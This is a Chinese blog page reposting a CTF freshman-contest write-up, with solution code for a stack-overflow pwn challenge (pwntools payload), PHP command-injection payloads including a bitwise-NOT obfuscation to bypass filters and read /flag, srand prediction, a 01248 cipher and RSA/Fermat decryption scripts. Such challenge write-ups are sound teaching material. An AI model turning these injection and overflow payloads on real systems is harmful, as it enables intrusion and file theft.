@@ -1,0 +1,207 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【竞赛】2023 Dozer 新生赛考核 wp | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="2023 Dozer 新生赛考核 5 题 WP，srand 随机数预测 + ret2libc + pyzipper AES 嵌套 + RSA + 01248 密码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【竞赛】2023 Dozer 新生赛考核 wp">
+<meta property="og:url" content="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Pwn/%E7%AB%9E%E8%B5%9B-2023Dozer%E6%96%B0%E7%94%9F%E8%B5%9B%E8%80%83%E6%A0%B8wp/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="2023 Dozer 新生赛考核 5 题 WP，srand 随机数预测 + ret2libc + pyzipper AES 嵌套 + RSA + 01248 密码。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="新生赛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Pwn/%E7%AB%9E%E8%B5%9B-2023Dozer%E6%96%B0%E7%94%9F%E8%B5%9B%E8%80%83%E6%A0%B8wp/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '【竞赛】2023 Dozer 新生赛考核 wp',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【竞赛】2023 Dozer 新生赛考核 wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-31T16:00:00.000Z" title="发表于 2023-01-01 00:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-31T16:00:00.000Z" title="更新于 2023-01-01 00:00:00">2023-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【竞赛】2023 Dozer 新生赛考核 wp"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/141483.html">https://www.ctfiot.com/141483.html</a><br>ID: 141483</p>
+</blockquote>
+<p>点击上方蓝字给我们加星标⭐，不错过最新内容</p>
+<p>新生赛总结</p>
+<p>▼</p>
+<p>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;<br>int main() { int i,image,buf;<br> srand(0x22); for(i&#x3D;0;i&lt;&#x3D;11;i++){ image&#x3D;rand()%3; printf(“%d “,image);<br> }}</p>
+<p>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;<br>int main() { int i,image,buf;<br> srand(0x2a); for(i&#x3D;0;i&lt;&#x3D;50;i++){ image&#x3D;rand()%3; if(image&#x3D;&#x3D;0) printf(“2n”); if(image&#x3D;&#x3D;1) printf(“0n”); if(image&#x3D;&#x3D;2) printf(“1n”);<br> }}</p>
+<p>exp<br>from pwn import *r&#x3D;process(‘.&#x2F;stack’)#本地连接程序#r &#x3D; remote(‘112.6.51.212’,30189)#连接远程</p>
+<p>payload&#x3D;b’a’*0x78+p64(0x00000000004007e3)+p64(0x400808)+p64(0x40073B)#攻击链r.sendlineafter(b”overflowsnn”,payload)#接收发送攻击链r.interactive()#直接进行交互，相当于回到shell的模式</p>
+<p>import pyzipperimport os<br>def extract_nested_zip(zip_file): with pyzipper.AESZipFile(zip_file, ‘r’) as zipf: password_filename &#x3D; None for file_info in zipf.filelist: if file_info.filename.startswith(‘password_’): password_filename &#x3D; file_info.filename break if password_filename is None: print(f’未找到密码文件，无法解密压缩包 “{zip_file}”。’) return with zipf.open(password_filename) as pwd_file: password &#x3D; pwd_file.read().decode() with pyzipper.AESZipFile(zip_file, ‘r’, encryption&#x3D;pyzipper.WZ_AES) as inner_zipf: for file_info in inner_zipf.filelist: inner_zipf.extract(file_info, path&#x3D;’.’, pwd&#x3D;password.encode()) print(f’已解压文件: {file_info.filename}’) next_zip_filename &#x3D; None for file_info in inner_zipf.filelist: if file_info.filename.endswith(‘.zip’): next_zip_filename &#x3D; file_info.filename break if next_zip_filename: extract_nested_zip(next_zip_filename)<br>if <strong>name</strong> &#x3D;&#x3D; ‘<strong>main</strong>‘: outermost_zip_file &#x3D; ‘manyzip_499.zip’ extract_nested_zip(outermost_zip_file)</p>
+<p>原理很简单，有了1，2，4，8这四个简单的数字，你可以以加法表示出0-9任何一个数字，例如0&#x3D;28，7&#x3D;124，9&#x3D;18。这样，再用1-26来表示A-Z，就可以用作密码了。为了不至于混乱，引用了第五个数字0，来用作间隔，以避免翻译错误，所以还可以称“01248密码”。</p>
+<p>a&#x3D;”120222480111222448011224240112448014224201222201844201422084204242242012202224802120184420881210122408240124”s&#x3D;a.split(‘0’)print(s)l&#x3D;[]for i in s: sum&#x3D;0 for j in i: sum+&#x3D;eval(j) l.append(chr(sum+64))print(‘’.join(l))</p>
+<p>import libnum<br>import gmpy2</p>
+<p>p &#x3D; 134096351641873733136655136258930346068666059727369503282043358355700127445567145015864534393648722390354391864886220859764835960001384898109024177275632112341866578728402687911008617032055729760873500316750429826070955961883087776809018398637916325085984289076923243657957898725206939956833810785599676729081<br>q &#x3D; 174103184868040863643318748725372782590375980254481106844909104639082212404057463322179700704433290948772456739103162440357371611490518612697711739090944270430948454322201815911126010072979510574940873419522755545296895048058252502599021139498869173058848513456305201212185556602542021019786049803486761575619<br>e &#x3D; 65537<br>n &#x3D; 23346601900034957555688205728495241197603710402649144851787338023529721742194127312047817399657806766767609016899148890792321953032265424697519828450283061929215380561118334803838533435756788037558393172185799965795876666508514498912225616313132295758111963327975946691723015094769391915622723746219695635703244442263293688623076006730992652392943763278634358911926029815126546840504505510331787504021704653483109395844912490151355318632539550539120625649870737699418228432053253123075546330645737636906674371251100640653395805629579624694238594583468588747282098538736123706732879326510925267827419261467515757876139<br>c &#x3D; 21059425587138275177851133719489520191806374210483381046129196548327926882726571104652182980009173089102114951221766632805478392995791154212734039464866621083806832531787252690774774079642174403366738764142141333611676848288053968926219012504301602753768504662298743543510989548687429433750042177449318246891000022681153221275734518915972309438820282840114939223344564087181810107485654527166576224292423298530128805470851466693656140130112962076400703900223613390342448935776739787297327454611230862799071044833028841126247371401388582818660833906604610436650137961239491977984238538541018508899164870408658111225592</p>
+<p>phi &#x3D; (p-1)*(q-1)</p>
+<p>d &#x3D; gmpy2.invert(e, phi)<br>m &#x3D; gmpy2.powmod(c, d, n)</p>
+<p>print(libnum.n2s(int(m)).decode())</p>
+<p>import gmpy2import libnum<br>def isqrt(n): x &#x3D; n y &#x3D; (x + n &#x2F;&#x2F; x) &#x2F;&#x2F; 2 while y &lt; x: x &#x3D; y y &#x3D; (x + n &#x2F;&#x2F; x) &#x2F;&#x2F; 2 return x<br>def fermat(n, verbose&#x3D;True): a &#x3D; isqrt(n) b2 &#x3D; a<em>a - n b &#x3D; isqrt(n) count &#x3D; 0 while b</em>b !&#x3D; b2: a &#x3D; a + 1 b2 &#x3D; a<em>a - n b &#x3D; isqrt(b2) count +&#x3D; 1 p&#x3D;a+b q&#x3D;a-b assert n &#x3D;&#x3D; p * q print(‘p&#x3D;’,p) print(‘q&#x3D;’,q) return p, qn&#x3D; 9902818856222787024563072133440550938710227558135328161789597975061589956056992262033542077154303618976791004431333531566549039602180273711537029693586182757724092450368200557073359408363479337363507885859556647468887536468774671586957716873885078043767796679063965432886918774554067185434296238290330438435760966311141004960151482088020397079850490003346872012237936581379969498669060779635164715522140773054302161538487178356007181001168935521820750705451939658389744968102068056144618223821116178519113949752796472136437303624285646057868957254876748746072125760376198949315110236060132257629082612239437688267817e&#x3D; 65537c&#x3D; 5159074368161541220237618453546581685955484179084194024992550056500438408178271386314960904546540848345370535310245598908803315809660211277776672289921238267645740671269916277896450223256967608644746977632342909627272084837606715644342530689351173316353848189214669987733795167033379669336141047211939013874739278870794953469189661132687676706346507396405946492642648897990248958917013256337570746910017175346336103441528515091504265815800116946786279239756724184064237114695548319993781206797074067095779971390244729292540495903352355048685746842568533136142923146303443882436592305037659264720790923302870859093878pq&#x3D;fermat(n)p&#x3D;pq[0]q&#x3D;pq[1]phi_n&#x3D;(p-1)</em>(q-1)d&#x3D;gmpy2.invert(e,phi_n)m&#x3D;pow(c,d,n)print(m)print(libnum.n2s(int(m)).decode())</p>
+<p>浪费您一秒时间</p>
+<p>点个关注不迷路~</p>
+<p>瞌睡虫小k</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">    #define _crt_secure_no_warnings</span><br><span class="line">    #include&lt;stdio.h&gt;</span><br><span class="line">    #include&lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> char s[26] = &quot;fq|gt&#125;ygneqogavqaeartkogt&quot;;</span><br><span class="line"></span><br><span class="line"> for (int i = 0; i &lt; strlen(s); i++)</span><br><span class="line"> &#123;</span><br><span class="line"> s[i] -= 2;</span><br><span class="line"> &#125;</span><br><span class="line"> printf(&quot;%s&quot;, s);</span><br><span class="line"></span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line">    #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;</span><br><span class="line">int main() &#123; int i,image,buf;</span><br><span class="line"> srand(0x22); for(i=0;i&lt;=11;i++)&#123; image=rand()%3; printf(&quot;%d &quot;,image);</span><br><span class="line"> &#125;&#125;</span><br><span class="line">    #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;</span><br><span class="line">int main() &#123; int i,image,buf;</span><br><span class="line"> srand(0x2a); for(i=0;i&lt;=50;i++)&#123; image=rand()%3; if(image==0) printf(&quot;2n&quot;); if(image==1) printf(&quot;0n&quot;); if(image==2) printf(&quot;1n&quot;);</span><br><span class="line"> &#125;&#125;</span><br><span class="line">exp</span><br><span class="line">from pwn import *r=process(&#x27;./stack&#x27;)#本地连接程序#r = remote(&#x27;112.6.51.212&#x27;,30189)#连接远程</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x78+p64(0x00000000004007e3)+p64(0x400808)+p64(0x40073B)#攻击链r.sendlineafter(b&quot;overflowsnn&quot;,payload)#接收发送攻击链r.interactive()#直接进行交互，相当于回到shell的模式</span><br><span class="line">payload:/?p=system(&#x27;ls /&#x27;); //查看文件目录</span><br><span class="line">   /?p=system(&#x27;cat /flag&#x27;);     //读文件内容</span><br><span class="line">知识点:</span><br><span class="line">request方法传参既能用get也能用post传</span><br><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~&#x27;phpinfo&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line">?cmd=(~%8C%86%8C%8B%9A%92)(~%93%8C);</span><br><span class="line">?cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%D5);</span><br><span class="line">import pyzipperimport os</span><br><span class="line">def extract_nested_zip(zip_file): with pyzipper.AESZipFile(zip_file, &#x27;r&#x27;) as zipf: password_filename = None for file_info in zipf.filelist: if file_info.filename.startswith(&#x27;password_&#x27;): password_filename = file_info.filename break if password_filename is None: print(f&#x27;未找到密码文件，无法解密压缩包 &quot;&#123;zip_file&#125;&quot;。&#x27;) return with zipf.open(password_filename) as pwd_file: password = pwd_file.read().decode() with pyzipper.AESZipFile(zip_file, &#x27;r&#x27;, encryption=pyzipper.WZ_AES) as inner_zipf: for file_info in inner_zipf.filelist: inner_zipf.extract(file_info, path=&#x27;.&#x27;, pwd=password.encode()) print(f&#x27;已解压文件: &#123;file_info.filename&#125;&#x27;) next_zip_filename = None for file_info in inner_zipf.filelist: if file_info.filename.endswith(&#x27;.zip&#x27;): next_zip_filename = file_info.filename break if next_zip_filename: extract_nested_zip(next_zip_filename)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;: outermost_zip_file = &#x27;manyzip_499.zip&#x27; extract_nested_zip(outermost_zip_file)</span><br><span class="line">原理很简单，有了1，2，4，8这四个简单的数字，你可以以加法表示出0-9任何一个数字，例如0=28，7=124，9=18。这样，再用1-26来表示A-Z，就可以用作密码了。为了不至于混乱，引用了第五个数字0，来用作间隔，以避免翻译错误，所以还可以称“01248密码”。</span><br><span class="line">a=&quot;120222480111222448011224240112448014224201222201844201422084204242242012202224802120184420881210122408240124&quot;s=a.split(&#x27;0&#x27;)print(s)l=[]for i in s: sum=0 for j in i: sum+=eval(j) l.append(chr(sum+64))print(&#x27;&#x27;.join(l))</span><br><span class="line">import libnum</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">p = 134096351641873733136655136258930346068666059727369503282043358355700127445567145015864534393648722390354391864886220859764835960001384898109024177275632112341866578728402687911008617032055729760873500316750429826070955961883087776809018398637916325085984289076923243657957898725206939956833810785599676729081</span><br><span class="line">q = 174103184868040863643318748725372782590375980254481106844909104639082212404057463322179700704433290948772456739103162440357371611490518612697711739090944270430948454322201815911126010072979510574940873419522755545296895048058252502599021139498869173058848513456305201212185556602542021019786049803486761575619</span><br><span class="line">e = 65537</span><br><span class="line">n = 23346601900034957555688205728495241197603710402649144851787338023529721742194127312047817399657806766767609016899148890792321953032265424697519828450283061929215380561118334803838533435756788037558393172185799965795876666508514498912225616313132295758111963327975946691723015094769391915622723746219695635703244442263293688623076006730992652392943763278634358911926029815126546840504505510331787504021704653483109395844912490151355318632539550539120625649870737699418228432053253123075546330645737636906674371251100640653395805629579624694238594583468588747282098538736123706732879326510925267827419261467515757876139</span><br><span class="line">c = 21059425587138275177851133719489520191806374210483381046129196548327926882726571104652182980009173089102114951221766632805478392995791154212734039464866621083806832531787252690774774079642174403366738764142141333611676848288053968926219012504301602753768504662298743543510989548687429433750042177449318246891000022681153221275734518915972309438820282840114939223344564087181810107485654527166576224292423298530128805470851466693656140130112962076400703900223613390342448935776739787297327454611230862799071044833028841126247371401388582818660833906604610436650137961239491977984238538541018508899164870408658111225592</span><br><span class="line"></span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = gmpy2.powmod(c, d, n)</span><br><span class="line"></span><br><span class="line">print(libnum.n2s(int(m)).decode())</span><br><span class="line">import gmpy2import libnum</span><br><span class="line">def isqrt(n): x = n y = (x + n // x) // 2 while y &lt; x: x = y y = (x + n // x) // 2 return x</span><br><span class="line">def fermat(n, verbose=True): a = isqrt(n) b2 = a*a - n b = isqrt(n) count = 0 while b*b != b2: a = a + 1 b2 = a*a - n b = isqrt(b2) count += 1 p=a+b q=a-b assert n == p * q print(&#x27;p=&#x27;,p) print(&#x27;q=&#x27;,q) return p, qn= 9902818856222787024563072133440550938710227558135328161789597975061589956056992262033542077154303618976791004431333531566549039602180273711537029693586182757724092450368200557073359408363479337363507885859556647468887536468774671586957716873885078043767796679063965432886918774554067185434296238290330438435760966311141004960151482088020397079850490003346872012237936581379969498669060779635164715522140773054302161538487178356007181001168935521820750705451939658389744968102068056144618223821116178519113949752796472136437303624285646057868957254876748746072125760376198949315110236060132257629082612239437688267817e= 65537c= 5159074368161541220237618453546581685955484179084194024992550056500438408178271386314960904546540848345370535310245598908803315809660211277776672289921238267645740671269916277896450223256967608644746977632342909627272084837606715644342530689351173316353848189214669987733795167033379669336141047211939013874739278870794953469189661132687676706346507396405946492642648897990248958917013256337570746910017175346336103441528515091504265815800116946786279239756724184064237114695548319993781206797074067095779971390244729292540495903352355048685746842568533136142923146303443882436592305037659264720790923302870859093878pq=fermat(n)p=pq[0]q=pq[1]phi_n=(p-1)*(q-1)d=gmpy2.invert(e,phi_n)m=pow(c,d,n)print(m)print(libnum.n2s(int(m)).decode())</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/141483.html">https://www.ctfiot.com/141483.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%E3%80%90%E7%AB%9E%E8%B5%9B%E3%80%912023Dozer%E6%96%B0%E7%94%9F%E8%B5%9B%E8%80%83%E6%A0%B8wp.full.md">CTF大赛WP集合&#x2F;articles&#x2F;【竞赛】2023Dozer新生赛考核wp.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%96%B0%E7%94%9F%E8%B5%9B/">新生赛</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/01/ctf-kb/wp/Pwn/%E7%9C%8B%E9%9B%AA2023_KCTF%E5%B9%B4%E5%BA%A6%E8%B5%9B_-_%E7%AC%AC%E5%9B%9B%E9%A2%98%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%8F%8A%E8%A7%A3%E6%9E%90/" title="看雪2023 KCTF年度赛 | 第四题设计思路及解析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">看雪2023 KCTF年度赛 | 第四题设计思路及解析</div></div></a></div><div class="next-post pull-right"><a 